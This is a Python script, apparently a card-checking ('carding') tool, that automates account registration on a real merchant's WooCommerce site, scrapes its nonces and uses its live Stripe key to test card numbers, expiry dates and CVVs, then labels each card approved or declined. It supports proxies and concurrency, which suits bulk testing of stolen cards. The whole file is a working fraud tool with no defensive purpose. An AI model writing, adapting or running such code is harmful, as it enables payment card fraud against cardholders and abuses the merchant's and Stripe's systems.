import httpx
import random
import asyncio
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=10)


def gets(s, start, end):
    """Extract string between start and end markers"""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


async def create_stripe_auth_fixme(card, mes, ano, cvv, proxy=None):
    """
    Stripe Auth $0 checker via fixmemobile.com

    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year
        cvv: CVV
        proxy: Optional proxy

    Returns:
        dict with status and response
    """
    try:
        # Generate random credentials
        user = "cristniki" + str(random.randint(9999, 574545))
        mail = "cristniki" + str(random.randint(9999, 574545)) + "@gmail.com"

        # Create session
        session = httpx.AsyncClient(
            timeout=40,
            follow_redirects=True,
            proxies=proxy if proxy else None
        )

        # Step 1: Get registration page
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        response = await session.get('https://fixmemobile.com/my-account-2/', headers=headers)

        # Extract registration nonce
        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" /><')

        if not nonce:
            await session.aclose()
            return {"status": "error", "response": "Failed to get registration nonce"}

        # Step 2: Register account
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://fixmemobile.com',
            'referer': 'https://fixmemobile.com/my-account-2/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data = {
            'email': mail,
            'password': 'hdnnbkxNCH6yDna',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }

        response = await session.post('https://fixmemobile.com/my-account-2/', headers=headers, data=data)

        # Step 3: Get payment methods page
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'referer': 'https://fixmemobile.com/my-account-2/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        response = await session.get('https://fixmemobile.com/my-account-2/payment-methods/', headers=headers)

        # Step 4: Get add payment method page
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'referer': 'https://fixmemobile.com/my-account-2/payment-methods/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        response = await session.get('https://fixmemobile.com/my-account-2/add-payment-method/', headers=headers)

        # Extract payment nonce
        payment_nonce = gets(response.text, '"add_card_nonce":"', '"')

        if not payment_nonce:
            await session.aclose()
            return {"status": "error", "response": "Failed to get payment nonce"}

        # Step 5: Create Stripe payment method
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data = {
            'type': 'card',
            'billing_details[name]': ' ',
            'billing_details[email]': mail,
            'card[number]': card,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': '75b069b7-3af3-411a-8777-2ce73043a2b3b2cece',
            'muid': '11805fe3-45d1-447a-871a-6f5d64a3b9aab6f747',
            'sid': '9d30a447-9563-4301-a21d-02edd3386ab164f2c0',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/803162f903; stripe-js-v3/803162f903; split-card-element',
            'referrer': 'https://fixmemobile.com',
            'time_on_page': '82104',
            'key': 'pk_live_51NaddyLBcKK5IM53aEKl8NjeG0XkXL2lJcj7yMh04Dogx0IIm2Vo6poN6KKuJyWRMbleatB6tg62yJAo6DMwoe4k00c0CAP14L',
        }

        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        try:
            response_json = response.json()

            # Check for Stripe errors at payment method creation
            if 'error' in response_json:
                error_msg = response_json['error'].get('message', 'Card declined')
                error_code = response_json['error'].get('code', 'card_declined')

                await session.aclose()

                if 'incorrect_number' in error_code or 'invalid_number' in error_code:
                    return {"status": "declined", "response": "INCORRECT_NUMBER"}
                elif 'invalid_expiry' in error_code:
                    return {"status": "declined", "response": "INVALID_EXPIRY"}
                elif 'invalid_cvc' in error_code:
                    return {"status": "declined", "response": "INVALID_CVC"}
                else:
                    return {"status": "declined", "response": error_msg.upper().replace(' ', '_')}

            pm_id = response_json.get('id')

            if not pm_id:
                await session.aclose()
                return {"status": "error", "response": "Failed to create payment method"}

        except Exception as e:
            await session.aclose()
            return {"status": "error", "response": f"Payment method error: {str(e)}"}

        # Step 6: Create setup intent (auth card)
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://fixmemobile.com',
            'referer': 'https://fixmemobile.com/my-account-2/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': pm_id,
            'nonce': payment_nonce,
        }

        response = await session.post('https://fixmemobile.com/', params=params, headers=headers, data=data)
        await session.aclose()

        # Parse final response
        try:
            result_json = response.json()

            # Check for success
            if result_json.get('status') == 'success':
                return {"status": "approved", "response": "AUTH_SUCCESS_✅"}

            # Check for error
            error_msg = result_json.get('error', {}).get('message', '') if isinstance(result_json.get('error'), dict) else str(result_json.get('error', ''))

            if not error_msg and 'success' in response.text.lower():
                return {"status": "approved", "response": "CARD_ADDED_✅"}

            # Parse specific error messages
            if 'insufficient' in error_msg.lower():
                return {"status": "approved", "response": "INSUFFICIENT_FUNDS"}
            elif 'security code' in error_msg.lower() or 'cvc' in error_msg.lower() or 'cvv' in error_msg.lower():
                return {"status": "approved", "response": "INCORRECT_CVC"}
            elif 'zip' in error_msg.lower() or 'postal' in error_msg.lower():
                return {"status": "approved", "response": "INCORRECT_ZIP"}
            elif 'authenticate' in error_msg.lower() or '3d' in error_msg.lower():
                return {"status": "approved", "response": "3DS_REQUIRED"}
            elif 'decline' in error_msg.lower():
                return {"status": "declined", "response": "CARD_DECLINED"}
            elif 'risk' in error_msg.lower() or 'fraud' in error_msg.lower():
                return {"status": "declined", "response": "FRAUD_SUSPECTED"}
            else:
                return {"status": "declined", "response": error_msg.upper().replace(' ', '_') if error_msg else "CARD_DECLINED"}

        except:
            # If JSON parsing fails, check text response
            if 'success' in response.text.lower() or 'added' in response.text.lower():
                return {"status": "approved", "response": "CARD_ADDED_✅"}
            else:
                return {"status": "declined", "response": "CARD_DECLINED"}

    except Exception as e:
        return {"status": "error", "response": f"EXCEPTION: {str(e)}"}


async def async_stripe_auth_fixme(card, mes, ano, cvv, proxy=None):
    """Async wrapper for Stripe auth fixme"""
    return await create_stripe_auth_fixme(card, mes, ano, cvv, proxy)
